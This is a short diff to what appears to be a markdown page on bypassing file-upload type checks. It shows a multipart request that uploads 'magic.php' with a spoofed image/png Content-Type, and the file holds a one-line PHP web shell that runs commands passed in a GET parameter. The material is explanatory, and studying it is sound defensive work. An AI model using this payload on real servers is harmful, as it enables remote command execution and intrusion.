@@ -55,12 +55,13 @@ if ((($_FILES["file"]["type"] == "image/gif") ||
 ```
 
 + This can be bypassed by changing the `Content-Type` in the POST request sent to the server
-```php
+
+```bash
 Content-Disposition: form-data; name="file"; filename="magic.php"
 Content-Type: image/png
 
 <?php echo shell_exec($_GET["magic"]); ?>
-```
+```   
 
 
 ## External References 
